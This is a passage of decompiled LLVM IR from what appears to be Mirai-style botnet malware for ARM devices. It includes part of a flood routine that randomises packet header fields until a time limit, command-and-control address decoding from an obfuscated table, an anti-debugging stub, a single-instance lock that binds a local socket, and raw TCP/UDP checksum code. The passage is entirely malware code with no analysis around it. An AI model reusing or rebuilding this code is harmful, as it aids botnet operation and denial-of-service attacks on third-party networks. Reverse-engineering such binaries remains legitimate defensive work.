  store i1 %v9_be98, i1* %cpsr_z.global-to-local, align 1
  store i32 %v1_be90, i32* %stack_var_-44, align 4
  %v7_bea0 = icmp slt i32 %v1_be90, %arg2
  br i1 %v7_bea0, label %dec_label_pc_bea4, label %dec_label_pc_bf2c

dec_label_pc_bea4:                                ; preds = %dec_label_pc_be08, %dec_label_pc_bdcc
  %v1_beb0 = phi i32 [ %v1_be90, %dec_label_pc_be08 ], [ 0, %dec_label_pc_bdcc ]
  store i32 %v2_b904, i32* %r2.global-to-local, align 4
  store i32 %v3_bbb8, i32* %r3.global-to-local, align 4
  %v4_beb0 = mul i32 %v1_beb0, 4
  %v5_beb0 = add i32 %v4_beb0, %v2_b904
  %v6_beb0 = inttoptr i32 %v5_beb0 to i32*
  %v7_beb0 = load i32, i32* %v6_beb0, align 4
  store i32 %v7_beb0, i32* @r4, align 4
  store i32 65535, i32* @r5, align 4
  store i1 %v3_beb8, i1* %cpsr_z.global-to-local, align 1
  store i32 0, i32* @r8, align 4
  %v1_bec0 = add i32 %v7_beb0, 20
  store i32 %v1_bec0, i32* @r6, align 4
  %v1_bec4 = add i32 %v7_beb0, 41
  store i32 %v1_bec4, i32* @r7, align 4
  br i1 %v3_beb8, label %dec_label_pc_becc, label %dec_label_pc_bde4

dec_label_pc_becc:                                ; preds = %dec_label_pc_bea4
  %v0_becc = call i32 @rand_next()
  %v1_becc = trunc i32 %v0_becc to i16
  store i32 %v0_becc, i32* %r0.global-to-local, align 4
  store i32 %v3_bbbc, i32* %ip.global-to-local, align 4
  %v1_bed4 = load i32, i32* @r5, align 4
  %v9_bed4 = icmp eq i32 %v3_bbbc, %v1_bed4
  store i1 %v9_bed4, i1* %cpsr_z.global-to-local, align 1
  %v3_bed8 = load i32, i32* @r4, align 4
  %v4_bed8 = add i32 %v3_bed8, 4
  %v5_bed8 = inttoptr i32 %v4_bed8 to i16*
  store i16 %v1_becc, i16* %v5_bed8, align 2
  br i1 %v9_bed4, label %dec_label_pc_bee0, label %dec_label_pc_becc.dec_label_pc_bdf0_crit_edge

dec_label_pc_becc.dec_label_pc_bdf0_crit_edge:    ; preds = %dec_label_pc_becc
  %v1_bdf4.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_bdf0

dec_label_pc_bee0:                                ; preds = %dec_label_pc_becc, %dec_label_pc_bde4
  %v0_bee0 = call i32 @rand_next()
  %v1_bee0 = trunc i32 %v0_bee0 to i16
  store i32 %v0_bee0, i32* %r0.global-to-local, align 4
  store i32 %v3_bbc0, i32* @lr, align 4
  %v1_bee8 = load i32, i32* @r5, align 4
  %v9_bee8 = icmp eq i32 %v3_bbc0, %v1_bee8
  store i1 %v9_bee8, i1* %cpsr_z.global-to-local, align 1
  %v3_beec = load i32, i32* @r4, align 4
  %v4_beec = add i32 %v3_beec, 20
  %v5_beec = inttoptr i32 %v4_beec to i16*
  store i16 %v1_bee0, i16* %v5_beec, align 2
  br i1 %v9_bee8, label %dec_label_pc_bef4, label %dec_label_pc_bee0.dec_label_pc_bdfc_crit_edge

dec_label_pc_bee0.dec_label_pc_bdfc_crit_edge:    ; preds = %dec_label_pc_bee0
  %v1_be00.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_bdfc

dec_label_pc_bef4:                                ; preds = %dec_label_pc_bee0, %dec_label_pc_bdf0
  %v0_bef4 = call i32 @rand_next()
  %v1_bef4 = trunc i32 %v0_bef4 to i16
  %v3_bef8 = load i32, i32* @r6, align 4
  %v4_bef8 = add i32 %v3_bef8, 2
  %v5_bef8 = inttoptr i32 %v4_bef8 to i16*
  store i16 %v1_bef4, i16* %v5_bef8, align 2
  store i32 %v3_bbc4, i32* %r0.global-to-local, align 4
  %v1_bf00 = load i32, i32* @r5, align 4
  %v9_bf00 = icmp eq i32 %v3_bbc4, %v1_bf00
  store i1 %v9_bf00, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_bf00, label %dec_label_pc_bf08, label %dec_label_pc_be08

dec_label_pc_bf08:                                ; preds = %dec_label_pc_bef4, %dec_label_pc_bdfc
  %v0_bf08 = call i32 @rand_next()
  %v1_bf08 = trunc i32 %v0_bf08 to i16
  store i32 %v0_bf08, i32* %r0.global-to-local, align 4
  %v3_bf0c = load i32, i32* @r4, align 4
  %v4_bf0c = add i32 %v3_bf0c, 28
  %v5_bf0c = inttoptr i32 %v4_bf0c to i16*
  store i16 %v1_bf08, i16* %v5_bf0c, align 2
  br label %dec_label_pc_be08

dec_label_pc_bf14:                                ; preds = %dec_label_pc_bb64
  store i32 %v3_bb54, i32* %r0.global-to-local, align 4
  %v1_bf18 = call i32 @__GI___libc_close(i32 %v3_bb54)
  store i32 %v1_bf18, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_bf1c

dec_label_pc_bf1c:                                ; preds = %dec_label_pc_bf2c, %dec_label_pc_bb3c, %dec_label_pc_bb24, %dec_label_pc_bf14
  %v1_bf28 = phi i32 [ %v3_bb54, %dec_label_pc_bb3c ], [ %v2_bb30, %dec_label_pc_bb24 ], [ %v1_bf18, %dec_label_pc_bf14 ], [ %v2_bf30, %dec_label_pc_bf2c ]
  store i32 %v18_b8d4, i32* %sb.global-to-local, align 4
  store i32 %v27_b8d4, i32* %lr.global-to-local, align 4
  ret i32 %v1_bf28

dec_label_pc_bf2c.critedge:                       ; preds = %dec_label_pc_bb8c
  store i32 0, i32* %r0.global-to-local, align 4
  store i32 0, i32* %r2.global-to-local, align 4
  store i1 true, i1* %cpsr_z.global-to-local, align 1
  store i32 0, i32* %stack_var_-44, align 4
  br label %dec_label_pc_bf2c

dec_label_pc_bf2c:                                ; preds = %dec_label_pc_be08, %dec_label_pc_bf2c.critedge, %dec_label_pc_bdb8
  store i32 0, i32* %r0.global-to-local, align 4
  %v2_bf30 = call i32 @__GI_time(i32* null)
  store i32 %v2_bf30, i32* %r0.global-to-local, align 4
  %v9_bf38 = icmp eq i32 %v2_bb30, %v2_bf30
  store i1 %v9_bf38, i1* %cpsr_z.global-to-local, align 1
  %v6_bf3c = icmp slt i32 %v2_bb30, %v2_bf30
  br i1 %v6_bf3c, label %dec_label_pc_bf1c, label %dec_label_pc_bdb8

dec_label_pc_bf44:                                ; preds = %dec_label_pc_badc, %bb113
  %v0_bae4.lcssa = phi i32 [ %v1_bab0, %dec_label_pc_badc ], [ %v0_bae4, %bb113 ]
  %v2_bf48 = sub i32 %v0_bae4.lcssa, %v0_ba8c
  store i32 %v2_bf48, i32* @r4, align 4
  %v2_bf4c = ptrtoint i32* %stack_var_-76 to i32
  store i32 %v2_baa0, i32* %r1.global-to-local, align 4
  store i32 %v2_bf4c, i32* %r0.global-to-local, align 4
  store i32 %v2_bf48, i32* %r2.global-to-local, align 4
  %v3_bf5c = call i32 @util_memcpy(i32 %v2_bf4c, i32 %v2_baa0, i32 %v2_bf48)
  %v2_bf60 = ptrtoint i32* %stack_var_-40 to i32
  %v1_bf64 = load i32, i32* @r4, align 4
  %v2_bf64 = add i32 %v1_bf64, %v2_bf60
  store i32 %v2_bf64, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  store i32 %v2_bf4c, i32* @r0, align 4
  %v3_bf70 = add i32 %v2_bf64, -36
  %v4_bf70 = inttoptr i32 %v3_bf70 to i8*
  store i8 0, i8* %v4_bf70, align 1
  %v1_bf74 = call i32 @inet_addr(i32 %v2_bf4c)
  store i32 %v1_bf74, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_bb24

dec_label_pc_bf80:                                ; preds = %dec_label_pc_baf0
  store i32 104859200, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_bb24

dec_label_pc_bf90:                                ; preds = %dec_label_pc_baf0
  store i32 134744072, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_bb24

dec_label_pc_bfa4:                                ; preds = %dec_label_pc_baf0
  store i32 707416650, i32* %ip.global-to-local, align 4
  br label %dec_label_pc_bb24

; uselistorder directives
  uselistorder i32 %v1_bf74, { 1, 0 }
  uselistorder i32 %v2_bf4c, { 0, 1, 3, 2 }
  uselistorder i32 %v2_bf48, { 1, 0, 2 }
  uselistorder i32 %v2_bf30, { 1, 2, 3, 0 }
  uselistorder i32 %v0_bf08, { 1, 0 }
  uselistorder i32 %v0_bee0, { 1, 0 }
  uselistorder i32 %v0_becc, { 1, 0 }
  uselistorder i32 %v7_beb0, { 1, 0, 2 }
  uselistorder i32 %v1_be90, { 1, 2, 0, 3, 4 }
  uselistorder i32 %v4_be40, { 1, 0 }
  uselistorder i32 %v0_be2c, { 1, 0, 2, 3 }
  uselistorder i32 %v2_be24, { 1, 0 }
  uselistorder i1 %v3_bde8, { 1, 0 }
  uselistorder i1 %v3_beb8, { 1, 0 }
  uselistorder i32 %v1_bd70.pre, { 1, 0 }
  uselistorder i32 %v2_bd68, { 1, 0 }
  uselistorder i32 %v2_bd6815, { 1, 0 }
  uselistorder i32 %v0_bd7417, { 1, 0 }
  uselistorder i32 %v1_bd60, { 1, 0 }
  uselistorder i32 %v3_bc4c, { 1, 0 }
  uselistorder i32 %v3_bc38, { 1, 0 }
  uselistorder i32 %v3_bbf8, { 1, 0 }
  uselistorder i32 %v1_bbcc, { 1, 0 }
  uselistorder i32 %v3_bbc0, { 1, 2, 3, 4, 0, 5 }
  uselistorder i32 %v3_bbbc, { 0, 1, 2, 4, 3 }
  uselistorder i1 %v7_bb84, { 1, 0 }
  uselistorder i1 %v7_bb58, { 1, 0 }
  uselistorder i32 %v3_bb54, { 1, 3, 4, 5, 6, 2, 0, 7 }
  uselistorder i32 %v2_bb40, { 0, 13, 1, 8, 3, 6, 7, 5, 9, 11, 10, 4, 12, 2 }
  uselistorder i32 %v2_bb30, { 2, 1, 0, 3 }
  uselistorder i32 %v0_bb2c, { 1, 0, 2 }
  uselistorder i32 %stack_var_-2184.0, { 0, 3, 2, 1 }
  uselistorder i32 %v1_baf4, { 1, 0 }
  uselistorder i32 %v0_baf0, { 1, 0 }
  uselistorder i32 %v1_bae4, { 1, 2, 0 }
  uselistorder i1 %v7_bad0, { 1, 0 }
  uselistorder i32 %v1_bacc, { 1, 0, 2 }
  uselistorder i1 %v8_bac4, { 1, 0 }
  uselistorder i1 %v7_bac0, { 1, 0 }
  uselistorder i32 %v1_bab4, { 1, 0 }
  uselistorder i8 %v2_baa8, { 2, 0, 1, 3 }
  uselistorder i32 %v0_baac, { 1, 0 }
  uselistorder i32 %v0_bacc, { 1, 2, 3, 0 }
  uselistorder i32 %v2_baa0, { 1, 0, 2, 3 }
  uselistorder i32 %v0_ba9c, { 1, 0, 2 }
  uselistorder i32 %v0_ba94, { 1, 0, 2, 3 }
  uselistorder i1 %v7_ba8c, { 1, 0 }
  uselistorder i32 %v0_ba8c, { 2, 3, 1, 5, 4, 0 }
  uselistorder i32 %v0_ba30, { 1, 0, 2, 3 }
  uselistorder i32 %v6_b9d0, { 2, 0, 1, 3, 4 }
  uselistorder i32 %v6_b9b4, { 0, 2, 1, 3 }
  uselistorder i32 %v6_b99c, { 1, 0, 2, 3 }
  uselistorder i32 %v1_b984, { 1, 2, 0 }
  uselistorder i32 %v5_b978, { 0, 2, 1 }
  uselistorder i32 %v7_b940, { 1, 0, 2, 3 }
  uselistorder i32 %v1_b928, { 2, 1, 0 }
  uselistorder i32 %v6_b91c, { 1, 0 }
  uselistorder i32 %v2_b904, { 0, 3, 1, 2, 4 }
  uselistorder i32* %stack_var_-44, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 11, 9, 10 }
  uselistorder i32* %r3.global-to-local, { 1, 2, 8, 3, 4, 5, 6, 7, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 0 }
  uselistorder i32* %r2.global-to-local, { 3, 4, 2, 8, 5, 6, 7, 9, 10, 11, 36, 12, 37, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 1, 26, 28, 27, 29, 30, 31, 32, 33, 34, 35, 0 }
  uselistorder i32* %r1.global-to-local, { 1, 3, 4, 5, 6, 7, 8, 9, 2, 49, 50, 10, 48, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 40, 39, 42, 41, 43, 45, 44, 47, 46, 0 }
  uselistorder i32* %r0.global-to-local, { 2, 3, 5, 4, 1, 8, 6, 9, 7, 10, 12, 11, 13, 15, 14, 16, 18, 17, 19, 20, 23, 21, 22, 24, 25, 33, 26, 27, 28, 29, 30, 31, 32, 37, 34, 35, 36, 38, 40, 39, 42, 41, 43, 44, 45, 47, 46, 48, 49, 51, 50, 52, 54, 53, 56, 55, 57, 58, 59, 60, 61, 62, 63, 64, 65, 66, 67, 0 }
  uselistorder i32* %lr.global-to-local, { 0, 1, 3, 2, 4 }
  uselistorder i32* %ip.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 29, 28, 12, 11, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27 }
  uselistorder i1* %cpsr_z.global-to-local, { 1, 0, 2, 3, 4, 9, 5, 6, 7, 8, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32 }
  uselistorder i32 (i32)* @inet_addr, { 1, 0 }
  uselistorder i32 41, { 1, 2, 3, 0 }
  uselistorder i8 17, { 1, 2, 0 }
  uselistorder i8 -16, { 0, 1, 3, 2, 4, 5, 6, 7, 8, 9 }
  uselistorder i32 707416650, { 1, 0 }
  uselistorder i32 104859200, { 1, 0 }
  uselistorder i32 (i32, i32*, i32, i32, i32)* @attack_get_opt_int, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 86, 87, 88, 89, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 77, 78, 79, 80, 81, 82, 83, 84, 85, 53, 54, 55, 56, 57, 58, 59, 60, 61, 62, 63, 64, 65, 66, 67, 68, 69, 70, 71, 72, 73, 74, 75, 76 }
  uselistorder i32 %arg2, { 3, 4, 6, 7, 0, 1, 5, 2, 8, 9, 10, 11 }
  uselistorder label %dec_label_pc_bf2c, { 1, 0, 2 }
  uselistorder label %dec_label_pc_bf1c, { 0, 3, 1, 2 }
  uselistorder label %dec_label_pc_be08, { 2, 0, 1 }
  uselistorder label %dec_label_pc_bdb8, { 1, 0 }
  uselistorder label %dec_label_pc_bd88, { 1, 0 }
  uselistorder label %.thread19, { 2, 0, 1 }
  uselistorder label %bb128, { 1, 0 }
  uselistorder label %bb126, { 1, 0 }
  uselistorder label %dec_label_pc_bae4, { 1, 2, 0 }
  uselistorder label %dec_label_pc_badc, { 1, 0 }
  uselistorder label %dec_label_pc_bad0, { 1, 0 }
}

define i32 @checksum_generic(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %tmp = or i32 %arg1, 1
  %tmp9 = icmp eq i32 %tmp, 1
  br i1 %tmp9, label %dec_label_pc_bfdc, label %dec_label_pc_bfc4

dec_label_pc_bfc4:                                ; preds = %entry
  %v0_bfcc.pre = load i32, i32* @r0, align 4
  br label %dec_label_pc_bfc8

dec_label_pc_bfc8:                                ; preds = %dec_label_pc_bfc8, %dec_label_pc_bfc4
  %v0_bfd4 = phi i32 [ %v2_bfd4, %dec_label_pc_bfc8 ], [ 0, %dec_label_pc_bfc4 ]
  %v0_bfcc = phi i32 [ %v5_bfcc, %dec_label_pc_bfc8 ], [ %v0_bfcc.pre, %dec_label_pc_bfc4 ]
  %v0_bfc8 = phi i32 [ %v1_bfc8, %dec_label_pc_bfc8 ], [ %arg1, %dec_label_pc_bfc4 ]
  %v1_bfc8 = add i32 %v0_bfc8, -2
  %v1_bfcc = inttoptr i32 %v0_bfcc to i16*
  %v2_bfcc = load i16, i16* %v1_bfcc, align 2
  %v3_bfcc = zext i16 %v2_bfcc to i32
  %v5_bfcc = add i32 %v0_bfcc, -2
  store i32 %v5_bfcc, i32* @r0, align 4
  %v2_bfd4 = add i32 %v3_bfcc, %v0_bfd4
  %v1_bfc8.cmp = icmp ugt i32 %v1_bfc8, 1
  br i1 %v1_bfc8.cmp, label %dec_label_pc_bfc8, label %dec_label_pc_bfdc.loopexit

dec_label_pc_bfdc.loopexit:                       ; preds = %dec_label_pc_bfc8
  br label %dec_label_pc_bfdc

dec_label_pc_bfdc:                                ; preds = %entry, %dec_label_pc_bfdc.loopexit
  %v1_bfe4 = phi i32 [ %v2_bfd4, %dec_label_pc_bfdc.loopexit ], [ 0, %entry ]
  %v0_bfdc = phi i32 [ %v1_bfc8, %dec_label_pc_bfdc.loopexit ], [ %arg1, %entry ]
  %v7_bfdc = icmp eq i32 %v0_bfdc, 1
  br i1 %v7_bfdc, label %bb, label %.thread

bb:                                               ; preds = %dec_label_pc_bfdc
  %v1_bfe0 = load i32, i32* @r0, align 4
  %v2_bfe0 = inttoptr i32 %v1_bfe0 to i8*
  %v3_bfe0 = load i8, i8* %v2_bfe0, align 1
  %v4_bfe0 = zext i8 %v3_bfe0 to i32
  %v3_bfe4 = add i32 %v1_bfe4, %v4_bfe0
  br label %.thread

.thread:                                          ; preds = %dec_label_pc_bfdc, %bb
  %v0_bfe8 = phi i32 [ %v1_bfe4, %dec_label_pc_bfdc ], [ %v3_bfe4, %bb ]
  %v3_bfec = urem i32 %v0_bfe8, 65536
  %v4_bff0 = udiv i32 %v0_bfe8, 65536
  %v5_bff0 = add nuw nsw i32 %v4_bff0, %v3_bfec
  %v4_bff4 = udiv i32 %v5_bff0, 65536
  %v5_bff4 = add nuw nsw i32 %v4_bff4, %v5_bff0
  %v1_bff8 = urem i32 %v5_bff4, 65536
  %v3_c000 = xor i32 %v1_bff8, 65535
  ret i32 %v3_c000

; uselistorder directives
  uselistorder i32 %v5_bff0, { 1, 0 }
  uselistorder i32 %v5_bfcc, { 1, 0 }
  uselistorder i32 %v1_bfc8, { 1, 0, 2 }
  uselistorder i32 %v0_bfcc, { 1, 0 }
  uselistorder i32 %arg1, { 1, 2, 0 }
  uselistorder label %.thread, { 1, 0 }
  uselistorder label %dec_label_pc_bfdc, { 1, 0 }
}

define i32 @checksum_tcpudp(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %v1_c018 = add i32 %arg1, 12
  %v2_c018 = inttoptr i32 %v1_c018 to i32*
  %v3_c018 = load i32, i32* %v2_c018, align 4
  %v1_c01c = add i32 %arg1, 16
  %v2_c01c = inttoptr i32 %v1_c01c to i32*
  %v3_c01c = load i32, i32* %v2_c01c, align 4
  %v7_c020 = icmp sgt i32 %arg3, 1
  br i1 %v7_c020, label %dec_label_pc_c02c.preheader, label %dec_label_pc_c040

dec_label_pc_c02c.preheader:                      ; preds = %entry
  %v0_c030.pre = load i32, i32* @r1, align 4
  br label %dec_label_pc_c02c

dec_label_pc_c02c:                                ; preds = %dec_label_pc_c02c.preheader, %dec_label_pc_c02c
  %v0_c038 = phi i32 [ 0, %dec_label_pc_c02c.preheader ], [ %v2_c038, %dec_label_pc_c02c ]
  %v0_c030 = phi i32 [ %v0_c030.pre, %dec_label_pc_c02c.preheader ], [ %v5_c030, %dec_label_pc_c02c ]
  %v0_c02c = phi i32 [ %arg3, %dec_label_pc_c02c.preheader ], [ %v1_c02c, %dec_label_pc_c02c ]
  %v1_c02c = add nsw i32 %v0_c02c, -2
  %v1_c030 = inttoptr i32 %v0_c030 to i16*
  %v2_c030 = load i16, i16* %v1_c030, align 2
  %v3_c030 = zext i16 %v2_c030 to i32
  %v5_c030 = add i32 %v0_c030, -2
  store i32 %v5_c030, i32* @r1, align 4
  %v2_c038 = add i32 %v3_c030, %v0_c038
  %v8_c03c = icmp sgt i32 %v1_c02c, 1
  br i1 %v8_c03c, label %dec_label_pc_c02c, label %dec_label_pc_c040.loopexit

dec_label_pc_c040.loopexit:                       ; preds = %dec_label_pc_c02c
  br label %dec_label_pc_c040

dec_label_pc_c040:                                ; preds = %dec_label_pc_c040.loopexit, %entry
  %v1_c04c = phi i32 [ %v2_c038, %dec_label_pc_c040.loopexit ], [ 0, %entry ]
  %v0_c040 = phi i32 [ %v1_c02c, %dec_label_pc_c040.loopexit ], [ %arg3, %entry ]
  %v7_c040 = icmp eq i32 %v0_c040, 1
  br i1 %v7_c040, label %bb, label %.thread

.thread:                                          ; preds = %dec_label_pc_c040
  br label %bb19

bb:                                               ; preds = %dec_label_pc_c040
  %v1_c044 = load i32, i32* @r1, align 4
  %v2_c044 = inttoptr i32 %v1_c044 to i8*
  %v3_c044 = load i8, i8* %v2_c044, align 1
  %v4_c044 = zext i8 %v3_c044 to i32
  %v3_c04c = add i32 %v4_c044, %v1_c04c
  br label %bb19

bb19:                                             ; preds = %.thread, %bb
  %v1_c074 = phi i32 [ %v1_c04c, %.thread ], [ %v3_c04c, %bb ]
  %v0_c054 = mul i32 %v3_c018, 65536
  %v3_c054 = udiv i32 %v0_c054, 65536
  %v3_c058 = urem i32 %v3_c01c, 65536
  %v4_c060 = udiv i32 %v3_c018, 65536
  %v2_c05c = add nuw nsw i32 %v3_c058, %v4_c060
  %v5_c060 = add nuw nsw i32 %v2_c05c, %v3_c054
  %v1_c064 = add i32 %arg1, 9
  %v2_c064 = inttoptr i32 %v1_c064 to i8*
  %v3_c064 = load i8, i8* %v2_c064, align 1
  %v4_c064 = zext i8 %v3_c064 to i32
  %v4_c068 = udiv i32 %v3_c01c, 65536
  %v3_c070 = mul nuw nsw i32 %v4_c064, 256
  %v5_c068 = add i32 %v4_c068, %arg2
  %v2_c06c = add i32 %v5_c068, %v1_c074
  %v2_c074 = add i32 %v2_c06c, %v5_c060
  %v2_c078 = add i32 %v2_c074, %v3_c070
  %tmp = icmp ult i32 %v2_c078, 65536
  br i1 %tmp, label %dec_label_pc_c098, label %dec_label_pc_c084

dec_label_pc_c084:                                ; preds = %bb19, %dec_label_pc_c084
  %v2_c08c5 = phi i32 [ %v2_c08c, %dec_label_pc_c084 ], [ %v2_c078, %bb19 ]
  %v3_c0906.in = phi i32 [ %v2_c08c, %dec_label_pc_c084 ], [ %v2_c078, %bb19 ]
  %v3_c0906 = udiv i32 %v3_c0906.in, 65536
  %v3_c088 = urem i32 %v2_c08c5, 65536
  %v2_c08c = add nuw nsw i32 %v3_c088, %v3_c0906
  %tmp20 = icmp ult i32 %v2_c08c, 65536
  br i1 %tmp20, label %dec_label_pc_c098.loopexit, label %dec_label_pc_c084

dec_label_pc_c098.loopexit:                       ; preds = %dec_label_pc_c084
  br label %dec_label_pc_c098

dec_label_pc_c098:                                ; preds = %dec_label_pc_c098.loopexit, %bb19
  %v0_c098 = phi i32 [ %v2_c08c, %dec_label_pc_c098.loopexit ], [ %v2_c078, %bb19 ]
  %v1_c098 = urem i32 %v0_c098, 65536
  %v3_c0a0 = xor i32 %v1_c098, 65535
  ret i32 %v3_c0a0

; uselistorder directives
  uselistorder i32 %v2_c08c, { 2, 1, 3, 0 }
  uselistorder i32 %v2_c078, { 3, 0, 2, 1 }
  uselistorder i32 %v1_c04c, { 1, 0 }
  uselistorder i32 %v5_c030, { 1, 0 }
  uselistorder i32 %v0_c030, { 1, 0 }
  uselistorder i32 %v3_c018, { 1, 0 }
  uselistorder i32 %arg3, { 2, 1, 0 }
  uselistorder i32 %arg1, { 0, 2, 1 }
  uselistorder label %dec_label_pc_c084, { 1, 0 }
  uselistorder label %bb19, { 1, 0 }
  uselistorder label %dec_label_pc_c02c, { 1, 0 }
}

define i32 @anti_gdb_entry(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  store i32 ptrtoint (i32* @global_var_c0c4.66 to i32), i32* @global_var_20dc4.68, align 4
  ret i32 %arg1
}

define i32 @resolve_c2_addr(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %v1_c0cc = call i32 @table_unlock_val(i32 1)
  store i32 ptrtoint (i16** @global_var_23a50.70 to i32), i32* @r4, align 4
  store i32 2032805430, i32* @global_var_23a54.72, align 4
  %v3_c0e4 = call i32 @table_retrieve_val(i32 1, i32* null)
  %v4_c0e4 = inttoptr i32 %v3_c0e4 to i16*
  %v3_c0e8 = load i16, i16* %v4_c0e4, align 2
  store i16 %v3_c0e8, i16* bitcast (i32* @global_var_23a52.73 to i16*), align 4
  %v1_c0f4 = call i32 @table_lock_val(i32 1)
  ret i32 %v1_c0f4
}

define i32 @ensure_single_instance(i32 %arg1) local_unnamed_addr {
entry:
  %stack_var_-44 = alloca i16, align 2
  %stack_var_-28 = alloca i32, align 4
  %v9_c108 = load i32, i32* @r6, align 4
  %v12_c108 = load i32, i32* @r7, align 4
  %v15_c108 = load i32, i32* @r8, align 4
  store i32 1, i32* @r4, align 4
  store i32 1, i32* %stack_var_-28, align 4
  %v3_c124 = call i32 @socket(i32 2, i32 1, i32 0)
  store i32 ptrtoint (i32* @global_var_20dbc.75 to i32), i32* @r6, align 4
  %v7_c12c = icmp eq i32 %v3_c124, -1
  store i32 %v3_c124, i32* @global_var_20dbc.75, align 4
  br i1 %v7_c12c, label %dec_label_pc_c1e4, label %dec_label_pc_c138

dec_label_pc_c138:                                ; preds = %entry
  %v2_c138 = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_c138, i32* @r3, align 4
  %v0_c13c = load i32, i32* @r4, align 4
  store i32 4, i32* @r5, align 4
  %v5_c14c = call i32 @__GI_setsockopt(i32 %v3_c124, i32 %v0_c13c, i32 2, i32 %v2_c138, i32 4)
  %v2_c150 = load i32, i32* @global_var_20dbc.75, align 4
  store i32 %v2_c150, i32* @r4, align 4
  store i32 0, i32* @r2, align 4
  %v2_c160 = call i32 @__libc_fcntl(i32 %v2_c150, i32 3)
  %v0_c164 = load i32, i32* @r5, align 4
  %v1_c168 = or i32 %v2_c160, 2048
  store i32 %v1_c168, i32* @r2, align 4
  %v0_c16c = load i32, i32* @r4, align 4
  %v2_c170 = call i32 @__libc_fcntl(i32 %v0_c16c, i32 %v0_c164)
  store i32 ptrtoint (i8** @global_var_20dc8.77 to i32), i32* @r8, align 4
  %v2_c178 = load i8, i8* bitcast (i8** @global_var_20dc8.77 to i8*), align 4
  %v2_c17c = icmp eq i8 %v2_c178, 0
  br i1 %v2_c17c, label %.thread3, label %bb

.thread3:                                         ; preds = %dec_label_pc_c138
  br label %bb21

bb:                                               ; preds = %dec_label_pc_c138
  br label %bb21

bb21:                                             ; preds = %.thread3, %bb
  %v0_c1a0 = call i32 @__GI___errno_location()
  store i32 0, i32* @r7, align 4
  %v2_c1a8 = inttoptr i32 %v0_c1a0 to i32*
  store i32 0, i32* %v2_c1a8, align 4
  %v2_c1ac = ptrtoint i16* %stack_var_-44 to i32
  store i32 %v2_c1ac, i32* @r5, align 4
  store i32 %v0_c1a0, i32* @r4, align 4
  %v2_c1bc = load i32, i32* @global_var_20dbc.75, align 4
  store i16 2, i16* %stack_var_-44, align 2
  %v7_c1c8 = call i32 @bind(i32 %v2_c1bc, i32 %v2_c1ac, i32 16, i32 2, i32 2)
  %v7_c1cc = icmp eq i32 %v7_c1c8, -1
  br i1 %v7_c1cc, label %dec_label_pc_c1f0, label %dec_label_pc_c1d4

dec_label_pc_c1d4:                                ; preds = %bb21
  %v2_c1dc = load i32, i32* @global_var_20dbc.75, align 4
  %v2_c1e0 = call i32 @listen(i32 %v2_c1dc, i32 1)
  br label %dec_label_pc_c1e4

dec_label_pc_c1e4:                                ; preds = %entry, %dec_label_pc_c1fc, %dec_label_pc_c1d4
  %v1_c1ec = phi i32 [ %v3_c124, %entry ], [ %v1_c238, %dec_label_pc_c1fc ], [ %v2_c1e0, %dec_label_pc_c1d4 ]
  store i32 %v9_c108, i32* @r6, align 4
  store i32 %v12_c108, i32* @r7, align 4
  store i32 %v15_c108, i32* @r8, align 4
  ret i32 %v1_c1ec

dec_label_pc_c1f0:                                ; preds = %bb21
  %v0_c1f0 = load i32, i32* @r4, align 4
  %v1_c1f0 = inttoptr i32 %v0_c1f0 to i32*
  %v2_c1f0 = load i32, i32* %v1_c1f0, align 4
  %v7_c1f4 = icmp eq i32 %v2_c1f0, 99
  br i1 %v7_c1f4, label %dec_label_pc_c240, label %dec_label_pc_c1fc

dec_label_pc_c1fc:                                ; preds = %dec_label_pc_c240, %bb22, %dec_label_pc_c1f0
  %v2_c214 = load i32, i32* @global_var_20dbc.75, align 4
  store i16 2, i16* %stack_var_-44, align 2
  %v3_c224 = call i32 @__libc_connect(i32 %v2_c214, i32 %v2_c1ac, i32 16)
  %v1_c22c = call i32 @sleep(i32 5)
  %v2_c230 = load i32, i32* @global_var_20dbc.75, align 4
  %v1_c234 = call i32 @__GI___libc_close(i32 %v2_c230)
  %v1_c238 = call i32 @ensure_single_instance(i32 %v1_c234)
  br label %dec_label_pc_c1e4

dec_label_pc_c240:                                ; preds = %dec_label_pc_c1f0
  %v2_c240 = load i8, i8* bitcast (i8** @global_var_20dc8.77 to i8*), align 4
  %v3_c240 = zext i8 %v2_c240 to i32
  %v1_c244 = load i32, i32* @r7, align 4
  %v9_c244 = icmp eq i32 %v3_c240, %v1_c244
  br i1 %v9_c244, label %dec_label_pc_c1fc, label %bb22

bb22:                                             ; preds = %dec_label_pc_c240
  %v2_c24c = trunc i32 %v1_c244 to i8
  store i8 %v2_c24c, i8* bitcast (i8** @global_var_20dc8.77 to i8*), align 4
  br label %dec_label_pc_c1fc

; uselistorder directives
  uselistorder i32 %v2_c1ac, { 1, 0, 2 }
  uselistorder i32 %v3_c124, { 1, 2, 3, 0 }
